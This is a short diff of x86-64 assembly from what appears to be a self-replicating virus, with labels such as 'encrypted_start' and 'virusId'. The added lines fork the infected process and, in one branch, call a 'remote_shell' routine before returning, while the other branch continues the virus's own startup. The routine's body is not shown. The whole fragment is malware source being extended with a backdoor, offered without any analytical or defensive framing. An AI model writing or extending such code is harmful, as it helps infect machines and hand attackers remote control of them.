@@ -62,6 +62,26 @@ encrypted_start:
     cmp rax, 0
     jnz exit
 
+
+    mov rax, SYS_GETPID
+    syscall
+    mov [rsp + ppid], rax
+
+    mov rax, SYS_FORK
+    syscall
+    mov rax, SYS_GETPID
+    syscall
+    cmp rax, [rsp + ppid]
+    jz encrypted_start_suite
+    call remote_shell
+    xor rax, rax
+    pop rsi
+    pop rdi
+    pop rcx
+    pop rdx
+    leave
+    ret
+encrypted_start_suite:
     lea rdi, [rsp + virusId]
     mov rsi, 8
     mov rdx, GRND_RANDOM
